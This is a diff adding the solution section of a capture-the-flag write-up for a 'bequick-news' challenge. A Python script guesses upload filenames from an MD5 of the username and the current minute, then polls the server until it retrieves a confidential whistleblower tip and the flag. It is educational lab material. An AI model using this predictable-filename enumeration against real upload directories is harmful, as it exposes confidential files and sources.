@@ -94,4 +94,46 @@ Given the fact we have the username *tipuser* and the destination folder */stati
 
 With the following solve script, we were eventually given the flag:
 
+```
+import hashlib
+import time
+import requests
+import math
+
+username = "tipuser"
+url = "https://bequick-news.chall.uiactf.no/static/tmp_upload/"
+
+# Calculate current minute
+timestamp = math.floor(time.time() / 60)
+
+counter = 0
+while 1:
+    hash_name = hashlib.md5(username.encode() + str(timestamp).encode()).hexdigest()
+    filename = hash_name + ".txt"
+
+    request_url = url + filename
+    r = requests.get(request_url) 
+    print(timestamp, filename, username.encode() + str(timestamp).encode(), r.status_code, counter, request_url) 
+    counter += 1
+    if r.status_code != 404:
+        print(r.text)
+        break
+```
+*Note, this isn't the actual script used in the challenge. This is a recreation by me, but it is functionally the same.*
+
+```
+28489226 ebd9f3cc111d926c4785702305efa6e5.txt b'tipuser28489226' 404 22 https://bequick-news.chall.uiactf.no/static/tmp_upload/ebd9f3cc111d926c4785702305efa6e5.txt
+28489226 ebd9f3cc111d926c4785702305efa6e5.txt b'tipuser28489226' 404 23 https://bequick-news.chall.uiactf.no/static/tmp_upload/ebd9f3cc111d926c4785702305efa6e5.txt
+28489226 ebd9f3cc111d926c4785702305efa6e5.txt b'tipuser28489226' 404 24 https://bequick-news.chall.uiactf.no/static/tmp_upload/ebd9f3cc111d926c4785702305efa6e5.txt
+28489226 ebd9f3cc111d926c4785702305efa6e5.txt b'tipuser28489226' 200 25 https://bequick-news.chall.uiactf.no/static/tmp_upload/ebd9f3cc111d926c4785702305efa6e5.txt
+I am reaching out to disclose information regarding my former employer, a leading player in Norway's salmon industry, involved in unethical tax evasion practices. As a recent member of their finance department, I witnessed firsthand the implementation of dubious accounting methods designed to significantly minimize tax liabilities.
+
+My opposition to these practices ultimately led to my dismissal. I believe this matter deserves public attention due to its potential impact on tax fairness and the integrity of the industry. I am willing to provide further details and evidence to support an investigation into these allegations.
+
+Please contact me if you are interested in pursuing this story. you can contact me on my private email: awilliams@proton.me
+ 
+UIACTF{pr0tect_your_sources}
+
+```
+
 
